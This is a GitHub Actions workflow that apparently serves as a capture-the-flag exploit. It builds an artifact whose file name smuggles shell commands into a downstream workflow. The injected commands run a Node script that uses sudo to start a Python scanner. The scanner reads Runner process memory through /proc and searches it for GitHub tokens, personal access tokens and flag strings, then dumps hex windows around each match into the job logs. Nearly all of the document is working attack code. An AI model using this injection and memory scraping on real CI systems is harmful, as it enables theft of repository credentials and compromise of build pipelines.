name: Test

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          rm -rf content
          mkdir -p content
          printf 'forged report body' > content/body
          python3 - <<'PY'
          import os
          name = "body;" + "cd${IFS}$HOME;" + "cd${IFS}..;" * 14 + "cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt"
          assert len(name) < 255, len(name)
          open(os.path.join("content", name), "w").close()
          PY
          cat > content/scan.py <<'SCANEOF'
          import glob, os

          PAT = [b'github.token": {', b'READ_ONLY_PAT": {', b'FLAG": {', b'FLAG{', b'F\x00L\x00A\x00G\x00{', b'"value": "ghs_']
          out = []
          counts = {}
          LIM = 2

          def pids():
              for d in glob.glob('/proc/[0-9]*'):
                  pid = d.rsplit('/', 1)[-1]
                  try:
                      cmd = open(d + '/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf8', 'replace').strip()
                  except Exception:
                      continue
                  yield pid, cmd

          for pid, cmd in pids():
              if 'Runner' not in cmd:
                  continue
              out.append('PROC %s %s' % (pid, cmd[:100]))
              try:
                  maps = open('/proc/%s/maps' % pid).read().splitlines()
              except Exception:
                  continue
              total = 0
              for line in maps:
                  parts = line.split()
                  if len(parts) < 2 or 'r' not in parts[1]:
                      continue
                  try:
                      a, b = [int(x, 16) for x in parts[0].split('-')]
                  except Exception:
                      continue
                  if b <= a:
                      continue
                  off = a
                  with open('/proc/%s/mem' % pid, 'rb', 0) as f:
                      while off < b:
                          n = min(16 * 1024 * 1024, b - off)
                          try:
                              f.seek(off)
                              data = f.read(n)
                          except Exception:
                              off += n
                              continue
                          off += n
                          total += len(data)
                          for pat in PAT:
                              k = pid + '|' + str(pat)
                              if counts.get(k, 0) >= LIM:
                                  continue
                              i = data.find(pat)
                              while i != -1 and counts.get(k, 0) < LIM:
                                  win = data[max(0, i - 300):i + 60000]
                                  out.append('HIT %s %r hex=%s' % (pid, pat, win.hex()))
                                  counts[k] = counts.get(k, 0) + 1
                                  i = data.find(pat, i + 1)
              out.append('READ %s bytes=%d' % (pid, total))

          print('\n'.join(out)[:3000000])
          print('DONE')

          SCANEOF
          cat > content/p.js <<'JSEOF'
          const cp = require('child_process');
          let scan = '';
          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 512 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
          for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));

          JSEOF
          ls -la content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
